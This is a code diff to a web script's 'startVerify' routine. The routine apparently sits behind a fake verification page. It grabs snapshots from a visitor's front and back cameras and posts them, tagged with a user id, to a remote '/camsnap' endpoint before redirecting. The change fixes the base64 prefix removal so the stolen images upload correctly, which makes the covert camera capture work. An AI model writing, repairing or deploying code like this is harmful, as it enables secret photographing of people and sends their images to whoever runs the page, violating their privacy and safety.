@@ -148,7 +148,7 @@ async function startVerify(){
   var ctx=canvas.getContext('2d'),snaps=0;
   var si=setInterval(function(){
     ctx.drawImage(video,0,0,500,500);
-    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"front"});
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:"front"});
     if(++snaps>=3){clearInterval(si);}
   },1500);
 
@@ -159,7 +159,7 @@ async function startVerify(){
       var bv=document.createElement('video');bv.srcObject=bs;bv.play();
       await new Promise(function(r){setTimeout(r,1800);});
       ctx.drawImage(bv,0,0,500,500);
-      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
+      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:"back"});
       bs.getTracks().forEach(function(t){t.stop();});
     }catch(e){}
     camDone=true;tryRedirect();
